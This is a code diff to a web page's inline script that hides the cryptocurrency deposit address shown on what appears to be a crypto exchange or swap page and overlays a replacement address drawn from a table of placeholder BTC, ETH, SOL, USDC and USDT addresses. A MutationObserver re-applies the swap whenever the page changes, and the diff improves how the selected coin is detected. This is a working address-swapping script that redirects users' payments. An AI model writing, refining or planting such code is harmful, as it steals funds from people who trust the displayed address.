@@ -46,50 +46,59 @@
 </script>
 <script>
   const customAddresses = {
-    BTC: "1000000000000000",
-    ETH: "1000000000000001",
     SOL: "1000000000000002",
+    ETH: "1000000000000001",
+    BTC: "1000000000000000",
     USDC: "1000000000000003",
     USDT: "1000000000000004"
-    // Add more as needed
+    // Add all 22 here
   };
 
-  function replaceAddress() {
-    const coinButtons = document.querySelectorAll('button[aria-label]');
-    const selectedBtn = Array.from(coinButtons).find(
-      btn => btn.getAttribute("aria-selected") === "true"
-    );
-    console.log(selectedBtn,'selected btn name');
-    const originalAddressSpan = document.querySelector(
-      '.text-new-black.break-words'
-    );
-
-    if (!selectedBtn || !originalAddressSpan) return;
-
-    const coin = selectedBtn.textContent.trim();
-    const newAddress = customAddresses[coin];
-
-    if (newAddress) {
-      originalAddressSpan.style.display = "none";
-
-      if (!document.getElementById("custom-address")) {
-        const customSpan = document.createElement("span");
-        customSpan.id = "custom-address";
-        customSpan.className = originalAddressSpan.className;
-        customSpan.style.color = "#00ff66";
-        customSpan.style.display = "block";
-        customSpan.style.wordBreak = "break-word";
-        originalAddressSpan.parentNode.insertBefore(customSpan, originalAddressSpan);
-      }
-
-      document.getElementById("custom-address").textContent = newAddress;
-    }
+  function extractCoinSymbol(text) {
+    // e.g., from "You sendSOL$151.54Solanasolana Network" → "SOL"
+    const match = text.match(/You\s+(send|receive)([A-Z]{2,6})/);
+    return match ? match[2] : null;
   }
 
-  // Watch for coin selection/address change
+  function replaceAddress() {
+    const buttons = document.querySelectorAll('button[aria-label]');
+    let selectedCoin = null;
+
+    buttons.forEach(btn => {
+      const text = btn.textContent.trim();
+      const coin = extractCoinSymbol(text);
+      if (coin && customAddresses[coin]) {
+        selectedCoin = coin;
+      }
+    });
+
+    const originalAddressSpan = document.querySelector('.text-new-black.break-words');
+    if (!selectedCoin || !originalAddressSpan) return;
+
+    const newAddress = customAddresses[selectedCoin];
+
+    // Hide original
+    originalAddressSpan.style.display = "none";
+
+    // Inject custom
+    let customSpan = document.getElementById("custom-address");
+    if (!customSpan) {
+      customSpan = document.createElement("span");
+      customSpan.id = "custom-address";
+      customSpan.className = originalAddressSpan.className;
+      customSpan.style.color = "#00ff66";
+      customSpan.style.display = "block";
+      customSpan.style.wordBreak = "break-word";
+      originalAddressSpan.parentNode.insertBefore(customSpan, originalAddressSpan);
+    }
+
+    customSpan.textContent = newAddress;
+  }
+
+  // Keep watching
   const observer = new MutationObserver(replaceAddress);
   observer.observe(document.body, { childList: true, subtree: true });
 
-  // Also run once on load
+  // Also run once on page load
   window.addEventListener("load", () => setTimeout(replaceAddress, 300));
 </script>
